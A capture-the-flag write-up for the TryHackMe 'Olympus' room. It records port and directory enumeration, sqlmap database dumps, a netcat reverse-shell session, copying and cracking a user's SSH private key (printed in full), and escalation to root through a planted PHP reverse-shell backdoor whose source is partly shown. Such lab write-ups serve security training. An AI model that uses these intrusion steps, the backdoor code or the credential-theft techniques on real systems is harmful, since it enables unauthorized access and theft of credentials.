```
Olympus-writhup
```

```
──(root㉿kali)-[~/Desktop/tryhackme]
└─# nmap -sV -sC 10.49.136.71 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 13:55 -0400
Nmap scan report for olympus.thm (10.49.136.71)
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:ef:96:d4:02:64:b7:61:cf:30:0c:b6:2b:54:92:ce (RSA)
|   256 a4:fd:ae:2a:12:b2:72:ca:8d:dd:3a:f6:24:0e:11:87 (ECDSA)
|_  256 81:b9:a2:6b:16:0d:17:32:15:ba:31:7b:cf:3d:f1:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Olympus
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds

```

<img width="2826" height="1412" alt="image" src="https://github.com/user-attachments/assets/b7dffd8b-7d4c-4f59-a2d6-054e0dc5042d" />




```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# gobuster dir -u http://olympus.thm/ -w /usr/share/dirb/wordlists/common.txt   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```

<img width="2184" height="922" alt="image" src="https://github.com/user-attachments/assets/a2e2a0b4-bbfd-4728-9ae4-4e85ba99aa9a" />


<img width="2178" height="1382" alt="image" src="https://github.com/user-attachments/assets/db641c4b-30fd-493d-a8f7-85e87bddc262" />


<img width="2738" height="1444" alt="image" src="https://github.com/user-attachments/assets/476671e1-0bbe-4ee0-b309-591d64ea06ed" />



```
(root㉿kali)-[~/Desktop/tryhackme]
└─# sqlmap -r oly --dbs --batch 

available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

```

```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# sqlmap -r oly -D wordpress --tables --batch

Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+

```

```
sqlmap -r oly -D olympus -T flag -C flag –dump

Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!.............} |
+---------------------------+

```

```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# sqlmap -r oly -D olympus -T users –dump --batch

```


<img width="2648" height="506" alt="image" src="https://github.com/user-attachments/assets/9545e250-cfc1-4466-bf31-728cf542b7d8" />


```

```

<img width="2610" height="1066" alt="image" src="https://github.com/user-attachments/assets/fe007dad-c573-4565-a1a8-d06f5de6f0b5" />


<img width="2806" height="1426" alt="image" src="https://github.com/user-attachments/assets/36c3be2b-28b7-4717-a3b7-5f25adc659e8" />


```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# sqlmap -r oly -D olympus -T chats –dump --batch

```

<img width="2776" height="914" alt="image" src="https://github.com/user-attachments/assets/67028944-fb5b-4ffc-9144-0174cc7ec958" />


<img width="2616" height="828" alt="image" src="https://github.com/user-attachments/assets/5e4fb69c-0725-423b-80d9-28249e83cb2c" />


```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.160.62] from (UNKNOWN) [10.49.136.71] 40944
Linux ip-10-49-136-71 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 20:12:15 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-49-136-71:/$ cd /home
cd /home
www-data@ip-10-49-136-71:/home$ ls
ls
ubuntu  zeus
www-data@ip-10-49-136-71:/home$ cd zeus
cd zeus
www-data@ip-10-49-136-71:/home/zeus$ ls
ls
snap  user.flag  zeus.txt
www-data@ip-10-49-136-71:/home/zeus$ cat user.flag
cat user.flag
flag{Y0u_G0t_...............}
www-data@ip-10-49-136-71:/home/zeus$ 


 www-data@ip-10-49-136-71:/home/zeus$ find / -type f -group zeus 2>/dev/null
find / -type f -group zeus 2>/dev/null
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.bashrc
/home/zeus/.profile
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
www-data@ip-10-49-136-71:/home/zeus$ 02:43
02:43: command not found
www-data@ip-10-49-136-71:/home/zeus$ cd ../../../../../../var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
</../../var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
bash: cd: too many arguments
www-data@ip-10-49-136-71:/home/zeus$ cputils
cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: ./.ssh/id_rsa
./.ssh/id_rsa

Enter the Name of Target File: id_rsa
id_rsa

File copied successfully.
www-data@ip-10-49-136-71:/home/zeus$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
www-data@ip-10-49-136-71:/home/zeus$ 

```

```
┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# mousepad id_rsa    

┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# ssh2john id_rsa > key4john

┌──(root㉿kali)-[~/Desktop/tryhackme]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt key4john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snowflake        (id_rsa)     
1g 0:00:00:40 DONE (2026-09-24 16:50) 0.02461g/s 37.02p/s 37.02c/s 37.02C/s maurice..bunny
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


──(root㉿kali)-[~/Desktop/tryhackme]
└─# chmod 600 id_rsa


──(root㉿kali)-[~/Desktop/tryhackme]
└─# ssh -i id_rsa zeus@olympus.thm
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 24 Sep 2026 08:53:34 PM UTC

  System load:  0.01              Processes:             115
  Usage of /:   44.8% of 9.75GB   Users logged in:       0
  Memory usage: 77%               IPv4 address for eth0: 10.49.136.71
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Jul 16 07:52:39 2022
zeus@ip-10-49-136-71:~$ pwd
/home/zeus
zeus@ip-10-49-136-71:~$ ls
id_rsa  snap  user.flag  zeus.txt
zeus@ip-10-49-136-71:~$ find / -type f -group zeus 2>/dev/null
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.ssh/authorized_keys
/home/zeus/.ssh/id_rsa
/home/zeus/.ssh/id_rsa.pub
/home/zeus/snap/lxd/common/config/config.yml
/home/zeus/.gnupg/pubring.kbx
/home/zeus/.gnupg/trustdb.gpg
/home/zeus/.bashrc
/home/zeus/.profile
/home/zeus/.cache/motd.legal-displayed
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
zeus@ip-10-49-136-71:~$ cat /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

zeus@ip-10-49-136-71:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ uname -a; w; /lib/defended/libc.so.99
Linux ip-10-49-136-71 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 20:57:50 up  3:05,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/1    192.168.160.62   20:53    1.00s  0.02s  0.00s w
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
# cd ../../../../
# 
# pwd
/
# cd root
# ls
config  root.flag  snap
# cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{D4mN!_Y.........._}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
# cd ../../
# cd /etc
# sudo find /etc -type f -exec grep -l 'flag{.*}' {} \; 2>/dev/null
/etc/ssl/private/.b0nus.fl4g
# cat /etc/ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{Y0u_...........!}


As a reminder, here is a usefull regex :

grep -irl flag{




Hope you liked the room ;)

```
